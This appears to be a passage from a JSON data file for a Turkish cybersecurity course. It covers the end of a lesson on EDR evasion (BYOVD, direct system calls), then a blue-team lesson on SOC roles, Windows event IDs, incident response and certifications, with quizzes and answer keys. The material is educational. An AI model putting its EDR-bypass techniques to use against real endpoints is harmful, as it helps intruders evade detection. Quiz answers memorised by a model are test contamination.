        "tip": "Kernel seviyesinde izleme yapan EDR'lari atlatmak icin en tehlikeli yol BYOVD (Bring Your Own Vulnerable Driver) teknigidir; saldirgan imzali eski zafiyetli bir surucuyu yukleyerek kernel hafizasina yazar.",
        "terminalCommand": "echo 'Attack Surface Reduction (ASR) Kurallari'"
      }
    ],
    "quiz": {
      "question": "EDR'larin user-mode'da ntdll.dll fonksiyonlarina yerlestirdigi izleme kancalarini (hooks) atlatmak icin dogrudan CPU syscall talimatiyla cekirdekle iletisim kuran Red Team teknigine ne ad verilir?",
      "options": [
        "Direct System Calls (Doğrudan Sistem Çağrıları)",
        "DLL Hijacking",
        "Buffer Overflow",
        "Pass-the-Hash"
      ],
      "correct": 0,
      "explanation": "Direct System Calls, ntdll.dll icindeki degistirilmis fonksiyonlari kullanmak yerine gerekli Syscall numarasini dogrudan register'a yazip CPU'ya 'syscall' emri vererek EDR filtrelerini tamamen atlar."
    }
  },
  {
    "id": "blue-team-career",
    "phase": 7,
    "phaseTitle": "Faz 7: Mavi Takım & Kariyer",
    "title": "Mavi Takım (Blue Team), SOC Operasyonları & Kariyer",
    "icon": "shield-check",
    "difficulty": "Başlangıç",
    "duration": "60 dk",
    "xp": 150,
    "summary": "Savunmanin kalbi Guvenlik Operasyon Merkezi (SOC). SIEM analizi, Windows Event Loglari, Sigma kurallari, NIST Olay Mudahalesi (IR) ve global siber guvenlik kariyer haritasi.",
    "tags": [
      "BlueTeam",
      "SOC",
      "SIEM",
      "IncidentResponse",
      "SigmaRules",
      "Career"
    ],
    "sections": [
      {
        "heading": "1. Güvenlik Operasyon Merkezi (SOC) Mimarisi ve Roller",
        "content": "SOC (Security Operations Center), kurumsal varliklari 7/24 siber tehditlere karsi izleyen, tespit eden ve mudahale eden savunma ussudur:\n- Hiyerarsik Roller:\n  * Tier 1 (Triage Analyst): Gelen yuzlerce SIEM alarmini ilk inceleyen, yanlis alarmlari (False Positive) eleyen ve gercek tehditleri Tier 2'ye aktaran ekip.\n  * Tier 2 (Incident Responder): Gercek guvenlik ihlallerini derinlemesine inceleyen, koken neden analizi (Root Cause) yapan ve saldiriyi izole eden uzmanlar.\n  * Tier 3 (Threat Hunter): Hicbir alarm calmasa dahi agda gizlenmis gelismis kalici tehditleri (APT) proaktif olarak arayan kidemli avcilar.\n  * SOC Manager: Operasyonel surecleri, ekipleri ve yonetim raporlamalarini koordine eden lider.",
        "codeSnippet": "# SOC Triage Is Akisi:\n# Alarm Geldi -> Korelasyon Incelemesi -> IP/Domain Itibar Kontrolu (VirusTotal) ->\n# False Positive ise Kapat / True Positive ise Tier 2'ye Eskale Et",
        "tip": "Basarili bir SOC analisti olmanin kurali ezber degil; ag protokollerini ve isletim sistemi davranislarini 'normal' durumdayken cok iyi bilmektir. Normali bilmeyen anormalligi anlayamaz.",
        "terminalCommand": "uptime"
      },
      {
        "heading": "2. SIEM, SOAR ve Kritik Windows Event ID'leri",
        "content": "SIEM (Security Information and Event Management), tum agdan toplanan gigabaytlarca logu tek merkezde analiz eder ve korele eder (Splunk, Elastic, Sentinel):\n- Kritik Windows Guvenlik Event ID'leri:\n  * 4624: Basarili Oturum Acma (Logon Type 10: RDP, Logon Type 3: Ag/SMB)\n  * 4625: Basarisiz Oturum Acma (Brute-force saldirisi tespiti)\n  * 4688: Yeni bir Process Olusturuldu (Komut satiri argumanlariyla birlikte)\n  * 4720: Yeni bir Kullanici Hesabi Olusturuldu\n  * 4672: Ozel Ayrıcalıklar Atandi (Admin yetkileri)\n  * 1102: Guvenlik Gunlugu Temizlendi (Saldirganin iz silme cabasi)",
        "codeSnippet": "# PowerShell ile son 5 basarisiz giris denemesini sorgulama\nGet-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 5 | Format-Table TimeCreated, Message -AutoSize",
        "tip": "Sysmon (System Monitor), Microsoft'un ucretsiz gelismis izleme aractir. Event ID 1 (Process Creation), Event ID 3 (Network Connection) ve Event ID 8 (CreateRemoteThread) gibi Red Team saldirilarini saniyesinde yakalar.",
        "terminalCommand": "dmesg | tail -10 2>/dev/null || echo 'Sistem loglari hazir'"
      },
      {
        "heading": "3. Olay Müdahalesi (Incident Response) Yaşam Döngüsü",
        "content": "Bir saldiri gerceklestiginde panik yapilmaz; NIST SP 800-61 standardindaki 6 asamali yasam dongusu izlenir:\n1. Hazirlik (Preparation): Guvenlik araclari, planlar ve ekipler onceden hazirlanir.\n2. Tespit ve Analiz (Detection & Analysis): Saldirinin turu, kapsami ve etkilenen sistemler belirlenir.\n3. Sinirlama (Containment): Etkilenen makineler agdan izole edilir (Kabloyu cek veya EDR uzerinden izole et).\n4. Yok Etme (Eradication): Zararli yazilimlar, arka kapilar ve saldirganin hesaplari sistemden tamamen temizlenir.\n5. Iyilestirme (Recovery): Sistemler temiz yedekten geri yuklenir ve uretim agina guvenle geri alinir.\n6. Cikarilan Dersler (Lessons Learned): Saldirinin nasil gerceklestigi raporlanir ve bir daha tekrarlanmamasi icin guvenlik kontrolleri guncellenir.",
        "codeSnippet": "# Linux'ta Olay Mudahalesi Durumunda Calisan Supheli Baglantilari Bulma\nnetstat -pant | grep -i established\nlsof -i :4444\nfind /tmp -type f -mtime -1 -exec ls -la {} +",
        "tip": "Bir bilgisayarda zararli yazilim suphesi varsa ASLA hemen fisten cekip kapatmayin; bilgisayari kapatmak RAM bellegindeki (RAM) tum canli kanitlari, sifreleri ve calisan shellcode'u tamamen yok eder. Once RAM imaji alinmalidir.",
        "terminalCommand": "last -n 5 2>/dev/null || echo 'Son giris kayitlari listelendi'"
      },
      {
        "heading": "4. Siber Güvenlik Kariyer Haritası & Sertifikasyonlar",
        "content": "Siber guvenlik sektoru dunya capinda yuz binlerce uzman acigi olan en dinamik alandir. Basarili bir kariyer rotasi:\n- Baslangic Seviyesi:\n  * CompTIA Security+: Sektore giris icin altin standart genel guvenlik sertifikasi.\n  * eJPT (eLearnSecurity Junior Penetration Tester): Tamamen uygulamali ilk sizma testi sertifikasi.\n- Orta ve Ileri Seviye:\n  * OSCP (Offensive Security Certified Professional): Dunyada en cok taninan, 24 saatlik canli laboratuvar sinavina sahip unlu pentest sertifikasi.\n  * Blue Team: BTL1 (Blue Team Level 1), CompTIA CySA+.\n  * Kurumsal Yonetim: CISSP, CISM.\n- Portfoy Tavsiyesi: Kendi adiniza bir GitHub guvenlik blogu acin, CTF write-up'lari yazin ve gelistirdiginiz araclari paylasin.",
        "codeSnippet": "# Profesyonel Siber Guvenlik Calisma Rutini:\n# 1. Her gun 1 HackTheBox / TryHackMe / BZT-CTF Makinesi Coz\n# 2. Cozdugun makinenin teknik raporunu (Write-up) cikar\n# 3. GitHub portfoyune duzenli kod commiti yap",
        "tip": "Sertifikalar mulakat kapisini acar; ancak mulakattan basariyla geciren sey BZT CTF gibi pratik platformlarda gercek sistemleri hackleyerek kazandiginiz reflekslerdir.",
        "terminalCommand": "echo 'BZT Siber Guvenlik Egitim Yolculugu Basariyla Tamamlandi!'"
      }
    ],
    "quiz": {
      "question": "Windows Guvenlik Gunluklerinde (Security Event Log) yeni bir surecin (process) baslatildigini gosteren kritik Event ID hangisidir?",
      "options": [
        "4688",
        "4624",
        "4625",
        "1102"
      ],
      "correct": 0,
      "explanation": "Event ID 4688, yeni bir surecin olusturuldugunu gosterir. Komut satiri denetimi (Command Line Auditing) aktiflestirildiginde calistirilan komutun tum argumanlarini da kaydeder."
    }
  }
];
